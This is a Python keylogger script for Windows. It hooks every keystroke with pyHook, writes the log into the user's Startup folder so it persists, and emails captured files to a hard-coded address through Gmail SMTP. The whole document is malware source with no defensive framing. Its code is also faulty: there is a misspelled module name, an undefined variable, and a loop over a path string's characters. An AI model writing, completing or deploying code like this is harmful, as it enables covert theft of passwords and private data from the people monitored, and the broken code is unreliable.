import pyHook, pythoncom, sys, logging, os, platform, smtplib, datetime 
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email import Encoders

def archive(files):
    
    global computer, name, startup

    print("emailing")
    
    sender = 'email@email.com'
    receiver = 'email@email.com'
    pw = 'password'

    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = receiver
    msg['Subject'] = name

    os.chdir(files)
    filename = files

    part = MIMEBase('application', "octet-stream")
    part.set_payload(open(filename, "rb").read())
    Encoders.encode_base64(part)

    part.add_header('Content-Disposition', 'attachment; filename="filename"')

    msg.attach(part)
    server = smptlib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(sender, pw)

    server.sendmail(sender, receiver, text)
    server.quit()


def data_log():
    
    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = OnKeyboardEvent
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()


def OnKeyboardEvent(event):
    
    logging.basicConfig(filename = log_file, level = logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True


computer = platform.uname()
name = os.environ['COMPUTERNAME']
dt = datetime.datetime.today().strftime('%Y-%m-%d-%H-%M-%S')
startup = os.path.expandvars("%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
mode = "archive"

while mode == "archive":
    os.chdir(startup)
    for files in startup:
        print(files)
        archive(files)
    else:
        mode = "log"
        log_file = os.path.expandvars("%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" + name + ".txt")
        break

while mode == "log":
    data_log()

